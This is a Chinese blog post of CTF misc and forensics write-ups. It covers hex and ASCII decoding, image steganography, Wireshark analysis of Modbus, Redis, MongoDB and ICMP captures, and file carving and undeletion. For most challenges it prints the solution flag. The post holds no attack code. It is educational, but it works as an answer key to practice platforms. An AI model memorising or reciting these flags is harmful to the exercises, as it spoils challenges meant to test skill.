<h2 id="misc1-x2F-DDCTF-2"><a href="#misc1-x2F-DDCTF-2" class="headerlink" title="misc1&#x2F;DDCTF(2)"></a>misc1&#x2F;DDCTF(2)</h2><p>题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd</span><br></pre></td></tr></table></figure>

<p>HEX解码失败</p>
<p>两两分开转10进制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">212 232 225 244 160 247 225 243 160 230 225 243 244 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 196 196 195 212 198 251 185 225 230 179 227 185 228 179 183 183 226 182 177 228 178 182 185 226 177 177 179 179 183 230 179 179 176 227 185 179 181 230 253</span><br></pre></td></tr></table></figure>

<p>发现比正常的字符的ascii码范围多了128</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">84 104 97 116 32 119 97 115 32 102 97 115 116 33 32 84 104 101 32 102 108 97 103 32 105 115 58 32 68 68 67 84 70 123 57 97 102 51 99 57 100 51 55 55 98 54 49 100 50 54 57 98 49 49 51 51 55 102 51 51 48 99 57 51 53 102 125</span><br></pre></td></tr></table></figure>

<p>转ascii码得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That was fast! The flag is: DDCTF&#123;9af3c9d377b61d269b11337f330c935f&#125;</span><br></pre></td></tr></table></figure>

<h2 id="low-x2F-世安杯-2"><a href="#low-x2F-世安杯-2" class="headerlink" title="low&#x2F;世安杯(2)"></a>low&#x2F;世安杯(2)</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34075268/article/details/88744599">参考</a></p>
<p><code>stegsolve</code>打开看到，说明存在LSB隐写</p>
<p><img data-src="/../images/WRITEUP/image-20230105173837585.png" alt="image-20230105173837585"></p>
<p>有一个方法是用画图工具打开图片后另存为<code>png</code>文件，然后<code>stegsolve</code>打开并切换到<code>Red plane 0</code>通道，可以看到二维码</p>
<p><img data-src="/../images/WRITEUP/image-20230105173636323.png" alt="image-20230105173636323"></p>
<p>扫码得到flag</p>
<p><code>flag&#123;139711e8e9ed545e&#125;</code></p>
<h2 id="神奇的Modbus-x2F-XCTF-2"><a href="#神奇的Modbus-x2F-XCTF-2" class="headerlink" title="神奇的Modbus&#x2F;XCTF(2)"></a>神奇的Modbus&#x2F;XCTF(2)</h2><p><code>wireshark</code>打开流量包，搜索分组字节流<code>sctf</code>，发现</p>
<p><img data-src="/../images/WRITEUP/image-20230105174641018.png" alt="image-20230105174641018"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sctf&#123;Easy_Mdbus&#125;</span><br></pre></td></tr></table></figure>

<p>但是作为flag输入错误，看题目，flag竟然是</p>
<p><code>sctf&#123;Easy_Modbus&#125;</code></p>
<h2 id="小小的PDF-x2F-CTF-2"><a href="#小小的PDF-x2F-CTF-2" class="headerlink" title="小小的PDF&#x2F;CTF(2)"></a>小小的PDF&#x2F;CTF(2)</h2><p>binwalk一下</p>
<p><img data-src="/../images/WRITEUP/image-20230105175353557.png" alt="image-20230105175353557"></p>
<p>dd分离一下</p>
<p><img data-src="/../images/WRITEUP/image-20230105175415258.png" alt="image-20230105175415258"></p>
<p><img data-src="/../images/WRITEUP/image-20230105175426525.png" alt="image-20230105175426525"></p>
<p>得到flag</p>
<p><code>SYC&#123;so_so_so_easy&#125;</code></p>
<h2 id="Cephalopod-x2F-XCTF-2"><a href="#Cephalopod-x2F-XCTF-2" class="headerlink" title="Cephalopod&#x2F;XCTF(2)"></a>Cephalopod&#x2F;XCTF(2)</h2><p>分组字节流搜索<code>flag</code></p>
<p><img data-src="/../images/WRITEUP/image-20230106095414369.png" alt="image-20230106095414369"></p>
<p>这里需要使用工具<code>tcpxtract</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpxtract -f  434c8c0ba659476caa9635b97f95600c.pcap</span><br></pre></td></tr></table></figure>

<p>分离得到两张图片，其中一张包含<code>flag</code></p>
<p><img data-src="/../images/WRITEUP/image-20230106100130872.png" alt="image-20230106100130872"></p>
<p><code>HITB&#123;95700d8aefdc1648b90a92f3a8460a2c&#125;</code></p>
<h2 id="Excaliflag-x2F-CTF-2"><a href="#Excaliflag-x2F-CTF-2" class="headerlink" title="Excaliflag&#x2F;CTF(2)"></a>Excaliflag&#x2F;CTF(2)</h2><p><code>stegsolve</code>打开，切换<code>Gray bits</code>，就能看到flag</p>
<p><img data-src="/../images/WRITEUP/image-20230106100716419.png" alt="image-20230106100716419"></p>
<p><code>3DS&#123;Gr4b_Only_th1s_B1ts&#125;</code></p>
<h2 id="4-2-x2F-WDCTF-2"><a href="#4-2-x2F-WDCTF-2" class="headerlink" title="4-2&#x2F;WDCTF(2)"></a>4-2&#x2F;WDCTF(2)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Eg qnlyjtcnzydl z umaujejmjetg qeydsn eu z bsjdtx tw sgqtxegc al kdeqd mgeju tw yrzegjsoj zns nsyrzqsx kejd qeydsnjsoj</span><br><span class="line">Ew ltm fgtk jds kzl tw sgqtxegc m kerr csj jds wrzc kdeqd eu qrzuueqzr-qeydsn_eu_gtj_usqmnejl_du</span><br></pre></td></tr></table></figure>

<p>这里用到了<a target="_blank" rel="noopener" href="https://quipqiup.com/">字频分析</a></p>
<p><img data-src="/../images/WRITEUP/image-20230106101317542.png" alt="image-20230106101317542"></p>
<p><img data-src="/../images/WRITEUP/image-20230106101257695.png" alt="image-20230106101257695"></p>
<p><code>flag&#123;classical-cipher_is_not_security_hs&#125;</code></p>
<h2 id="easycap-x2F-CTF-2"><a href="#easycap-x2F-CTF-2" class="headerlink" title="easycap&#x2F;CTF(2)"></a>easycap&#x2F;CTF(2)</h2><p><code>wireshark</code>追踪<code>tcp</code>流</p>
<p><img data-src="/../images/WRITEUP/image-20230106101535533.png" alt="image-20230106101535533"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG:385b87afc8671dee07550290d16a8071</span><br></pre></td></tr></table></figure>

<p>我以为flag格式是<code>flag&#123;&#125;</code>，结果<code>flag</code>就是</p>
<p><code>FLAG:385b87afc8671dee07550290d16a8071</code></p>
<h2 id="stage1-x2F-XCTF-2"><a href="#stage1-x2F-XCTF-2" class="headerlink" title="stage1&#x2F;XCTF(2)"></a>stage1&#x2F;XCTF(2)</h2><p><code>stegsolve</code>打开后切换<code>Gray bits</code>通道</p>
<p><img data-src="/../images/WRITEUP/image-20230106101858096.png" alt="image-20230106101858096"></p>
<p>扫描得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03F30D0AB6266A576300000000000000000100000040000000730D0000006400008400005A00006401005328020000006300000000030000000800000043000000734E0000006401006402006403006404006405006406006405006407006708007D00006408007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100712B00577C010047486400005328090000004E6941000000696C000000697000000069680000006961000000694C0000006962000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007307000000746573742E7079520300000001000000730A00000000011E0106010D0114014E280100000052030000002800000000280000000028000000007307000000746573742E707974080000003C6D6F64756C653E010000007300000000</span><br></pre></td></tr></table></figure>

<p>我以为要HEX解码，没想到要变成十六进制文件</p>
<p><img data-src="/../images/WRITEUP/image-20230106102247959.png" alt="image-20230106102247959"></p>
<p>可以看到有<code>pyt</code>的字眼</p>
<p>将该文件保存为<code>pyc</code>文件后，使用<code>uncompyle</code>反编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 1.pyc &gt;1.py</span><br></pre></td></tr></table></figure>

<p>得到python2代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def flag():</span><br><span class="line">    str = [</span><br><span class="line">     65, 108, 112, 104, 97, 76, 97, 98]</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    for i in str:</span><br><span class="line">        flag += chr(i)</span><br><span class="line"></span><br><span class="line">    print flag</span><br></pre></td></tr></table></figure>

<p>运行得到<code>AlphaLab</code>，而且<code>flag</code>就是</p>
<p><code>AlphaLab</code></p>
<h2 id="Miscellaneous-200-x2F-CTF-2"><a href="#Miscellaneous-200-x2F-CTF-2" class="headerlink" title="Miscellaneous-200&#x2F;CTF(2)"></a>Miscellaneous-200&#x2F;CTF(2)</h2><p>打开是一堆255</p>
<p><img data-src="/../images/WRITEUP/image-20230106103509581.png" alt="image-20230106103509581"></p>
<p>这是RGB三原色的数值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from ast import literal_eval</span><br><span class="line">from PIL import Image</span><br><span class="line">f = open(&#x27;62f4ea780ecf4e6bbef5f40d674ec073.txt&#x27;, &#x27;r&#x27;)</span><br><span class="line">corl = [literal_eval(line) for line in f.readlines()]</span><br><span class="line">f.close()</span><br><span class="line">img = Image.new(&#x27;RGB&#x27;, (270, 270), &#x27;#ffffff&#x27;)</span><br><span class="line">k=0</span><br><span class="line">for i in range(246):</span><br><span class="line">   for j in range(246):</span><br><span class="line">      img.putpixel ([i , j], corl[k])</span><br><span class="line">      k=k+1</span><br><span class="line"># 输出图片</span><br><span class="line">img.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>

<p>跑一下大佬的代码，得到flag.png</p>
<p><img data-src="/../images/WRITEUP/flag.png" alt="flag"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123; youc@n&#x27;tseeme &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Hear-with-your-Eyes-x2F-CTF-2"><a href="#Hear-with-your-Eyes-x2F-CTF-2" class="headerlink" title="Hear-with-your-Eyes&#x2F;CTF(2)"></a>Hear-with-your-Eyes&#x2F;CTF(2)</h2><blockquote>
<p>题目描述:用眼睛听这段音频</p>
</blockquote>
<p>用<code>Audacity</code>打开音频，切换多视图</p>
<p><img data-src="/../images/WRITEUP/image-20230106104132221.png" alt="image-20230106104132221"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:e5353bb7b57578bd4da1c898a8e2d767</span><br></pre></td></tr></table></figure>

<p><code>e5353bb7b57578bd4da1c898a8e2d767</code></p>
<h2 id="Hidden-Message-x2F-CTF-2"><a href="#Hidden-Message-x2F-CTF-2" class="headerlink" title="Hidden-Message&#x2F;CTF(2)"></a>Hidden-Message&#x2F;CTF(2)</h2><p><code>wireshark</code>追踪<code>UDP</code>流</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In contrast to classicas is a slightly looser term which may refer tor to 20th and 21st century physics in general and so always includes quantum theory and may assical level is a physical system in which thsics are valid There are application of classiassical physics is the  and molecules on upwards including the macrosrealm Inside the atom a and generally do not provide a correct descrimagnetic radiation is sect descriptions since quantum effects are obsy circumstances than qu Unlike quantum physicsby the principle of comechanics is in a sense deterministic</span><br><span class="line">Mathematiwhich Plancks constant does not appear According to the correspondencsts theorem as a system becomes larger or morel dynamics tends to emerge with some exception This is why we can usuhanics when dealing witever one of the most vigorous ongoing fields os classicalquantum correspondence This field ohow the laws of quantum physics give rise to c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l physics modern physic just quantum physics oinclude relativity</span><br><span class="line">A physical system on the cle laws of classical phye no restrictions on thcal principles but practically the scale of cllevel of isolated atomscopic and astronomical nd among atoms in a molecule the laws of classical physics break downption</span><br><span class="line">Moreover the classical theory of electroomewhat limited in its ability to provide corrervable in more everydaantum effects of matter classical physics is generally characterized plete determinism although the Manyworlds interpretation of quantum mcally classical physics equations are ones in e principle and Ehrenfe massive action  Plancks constant the classicas such as superfluidityally ignore quantum mech everyday objects instead the classical description will suffice Howf research in physics if research is concerned with the discovery of lassical physics in the limit of the large scales of the classical le</span><br></pre></td></tr></table></figure>

<p>好像并没有什么用</p>
<p><img data-src="/../images/WRITEUP/image-20230106104825641.png" alt="image-20230106104825641"></p>
<p>可以看到info是01相间的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10110111100110101001011010001100100110101001000110011101100110101000110110011000</span><br></pre></td></tr></table></figure>

<p>这里要转换一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01001000011001010110100101110011011001010110111001100010011001010111001001100111</span><br></pre></td></tr></table></figure>

<p>转ascii，得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Heisenberg</span><br></pre></td></tr></table></figure>

<h2 id="Recover-Deleted-File-x2F-CTF-2"><a href="#Recover-Deleted-File-x2F-CTF-2" class="headerlink" title="Recover-Deleted-File&#x2F;CTF(2)"></a>Recover-Deleted-File&#x2F;CTF(2)</h2><p>先用file命令看一下文件类型</p>
<p><img data-src="/../images/WRITEUP/image-20230106111024410.png" alt="image-20230106111024410"></p>
<p>然后用<code>fls</code>命令查看文件操作记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fls disk-image</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20230106111111635.png" alt="image-20230106111111635"></p>
<p>发现flag被删除，用<code>extundelete</code>工具恢复</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extundelete disk-image --restore-all</span><br></pre></td></tr></table></figure>

<p>恢复后有一个flag文件</p>
<p>cat查看发现可能是二进制文件</p>
<p><img data-src="/../images/WRITEUP/image-20230106111653833.png" alt="image-20230106111653833"></p>
<p>执行发现没权限</p>
<p><img data-src="/../images/WRITEUP/image-20230106111642089.png" alt="image-20230106111642089"></p>
<p><img data-src="/../images/WRITEUP/image-20230106111727047.png" alt="image-20230106111727047"></p>
<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de6838252f95d3b9e803b28df33b4baa</span><br></pre></td></tr></table></figure>

<h2 id="What-is-this-x2F-CTF-2"><a href="#What-is-this-x2F-CTF-2" class="headerlink" title="What-is-this&#x2F;CTF(2)"></a>What-is-this&#x2F;CTF(2)</h2><p><code>stegsolve</code>把两张图片<code>image combiner</code>一下，得到flag</p>
<p><img data-src="/../images/WRITEUP/image-20230106112133614.png" alt="image-20230106112133614"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AZADI TOWER</span><br></pre></td></tr></table></figure>

<h2 id="很普通的数独-x2F-ISCC-2"><a href="#很普通的数独-x2F-ISCC-2" class="headerlink" title="很普通的数独&#x2F;ISCC(2)"></a>很普通的数独&#x2F;ISCC(2)</h2><p>25张图片，二十五个数独，应该不用全解开吧？</p>
<p><img data-src="/../images/WRITEUP/image-20230106112342158.png" alt="image-20230106112342158"></p>
<p><del>不过闲的无聊也可以试试</del></p>
<h2 id="Become-a-Rockstar-x2F-NJUPT-CTF-2"><a href="#Become-a-Rockstar-x2F-NJUPT-CTF-2" class="headerlink" title="Become_a_Rockstar&#x2F;NJUPT-CTF(2)"></a>Become_a_Rockstar&#x2F;NJUPT-CTF(2)</h2><h1 id="CTFHUB-1"><a href="#CTFHUB-1" class="headerlink" title="CTFHUB"></a>CTFHUB</h1><h2 id="MYSQL流量"><a href="#MYSQL流量" class="headerlink" title="MYSQL流量"></a>MYSQL流量</h2><p>在<code>wireshark</code>里打开附件，选择<strong>分组详情</strong>搜索<strong>字符串</strong><code>CTFHUB</code>（因为该平台所有flag都是以该字符串开头）</p>
<p>然后就能得到flag</p>
<p><code>ctfhub&#123;mysql_is_S0_E4sy&#125;</code></p>
<h2 id="Redis流量"><a href="#Redis流量" class="headerlink" title="Redis流量"></a>Redis流量</h2><p>这一题也是把附件在<code>wireshark</code>中打开，在<strong>分组字节流</strong>里搜索<strong>字符串</strong><code>CTFHUB</code>，得到以下结果</p>
<p><img data-src="/../images/WRITEUP/image-20221205144506289.png" alt="image-20221205144506289"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fl4g1</span><br><span class="line">ctfhub&#123;6051d6123de43df</span><br></pre></td></tr></table></figure>

<p>可以看到<code>flag</code>并不完整，只有左边大括号，而且标注了<code>Fl4g1</code></p>
<p>尝试搜索<code>fl4g2</code>搜不到结果，搜索<code>flag</code>得到结果</p>
<p><img data-src="/../images/WRITEUP/image-20221205144721568.png" alt="image-20221205144721568"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag2</span><br><span class="line">ad7609804925c0121&#125;</span><br></pre></td></tr></table></figure>

<p>把二者拼起来就能得到<code>flag</code></p>
<p><code>ctfhub&#123;6051d6123de43dfad7609804925c0121&#125;</code></p>
<h2 id="MongoDB流量"><a href="#MongoDB流量" class="headerlink" title="MongoDB流量"></a>MongoDB流量</h2><p><strong>分组字节流</strong>搜索<strong>字符串</strong><code>CTFHUB</code>或者<code>flag</code>，在众多结果中的某一个里面记录了flag</p>
<p><img data-src="/../images/WRITEUP/image-20221205145753840.png" alt="image-20221205145753840"></p>
<p><code>ctfhub&#123;5f284ecc279d2cbd1af258bb53c7a5f6&#125;</code></p>
<h2 id="ICMP-Data"><a href="#ICMP-Data" class="headerlink" title="ICMP-Data"></a>ICMP-Data</h2><p>观察了一下数据包，发现多个包的字节流的唯一区别是中间的字符</p>
<p><img data-src="/../images/WRITEUP/image-20221205150251974.png" alt="image-20221205150251974"><img data-src="/../images/WRITEUP/image-20221205150302763.png" alt="image-20221205150302763"></p>
<p>而查看多个之后发现前几个拼起来恰好是<code>ctfhub</code>，所以猜测把全部拼起来就是<code>flag</code></p>
<p><code>ctfhub&#123;c87eb99796406ac0b&#125;</code></p>
<h2 id="ICMP-Length"><a href="#ICMP-Length" class="headerlink" title="ICMP-Length"></a>ICMP-Length</h2><p>题目提示<code>ping包的大小有些奇怪</code>，所以应该和长度有关系</p>
<p>把每个<code>reply包</code>的长度记录一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99 116 102 104 117 98 123 97 99 98 54 53 57 102 48 50 51 125</span><br></pre></td></tr></table></figure>

<p>把10进制转ascii码，可以得到flag</p>
<p><code>ctfhub&#123;acb659f023&#125;</code></p>
<h2 id="ICMP-LengthBinary"><a href="#ICMP-LengthBinary" class="headerlink" title="ICMP-LengthBinary"></a>ICMP-LengthBinary</h2><p>发现ICMP包的长度不是74就是106，记录一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">74的ascii是J，106是j</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10011100 10001011 10011001 10010111 10001010 10011101 10000100 11001111 11001011 10011010 10011001 10011010 10011011 11001110 10011010 11001111 11001010 10000010</span><br></pre></td></tr></table></figure>

<p>这里弄反了，74是0，106是1，最后把二进制转ascii码就能得到flag</p>
<p><code>ctfhub&#123;04efed1e05&#125;</code></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/study/" rel="tag"># study</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/08/30/Metaspolt/" rel="prev" title="Metaspolt">
                  <i class="fa fa-chevron-left"></i> Metaspolt
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/08/30/%E5%A6%82%E4%BD%95%E7%94%A8HEXO%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" rel="next" title="如何用HEXO框架搭建博客">
                  如何用HEXO框架搭建博客 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    
  
  <div class="comments">
  <script src="https://utteranc.es/client.js" repo="rikka5201/MyGitalk" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>
  </div>
  
  
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rikka</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">152k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">2:18</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>



    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  




<script class="next-config" data-name="exif" type="application/json">"{FocalLength}mm f/{FNumber} {ExposureTime}s"</script>
<script src="https://fastly.jsdelivr.net/npm/exif-js@2/exif.min.js"></script>
<script src="/lib/exif.js"></script>
  
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"plugRootPath":"live2dw/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/assets/haru02.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":50,"vOffset":0},"mobile":{"show":true},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
